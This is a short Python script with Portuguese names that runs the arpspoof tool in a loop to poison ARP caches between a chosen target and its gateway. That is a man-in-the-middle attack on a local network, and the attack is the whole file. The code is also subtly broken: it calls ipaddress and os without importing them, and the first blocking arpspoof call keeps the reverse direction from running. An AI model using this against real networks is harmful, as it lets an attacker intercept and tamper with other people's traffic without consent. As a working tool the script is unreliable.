import socket
import struct
import time

def calcular_gateway(rede):

    rede_obj = ipaddress.ip_network(rede, strict=False)
    return str(next(rede_obj.hosts()))

def arp_spoof(interface, alvo_ip, gateway_ip):

    while True:
        try:

            os.system(f"arpspoof -i {interface} -t {alvo_ip} {gateway_ip}")
  
            os.system(f"arpspoof -i {interface} -t {gateway_ip} {alvo_ip}")
            time.sleep(2)
        except KeyboardInterrupt:
            print("\nSpoofing interrompido pelo usuário.")
            break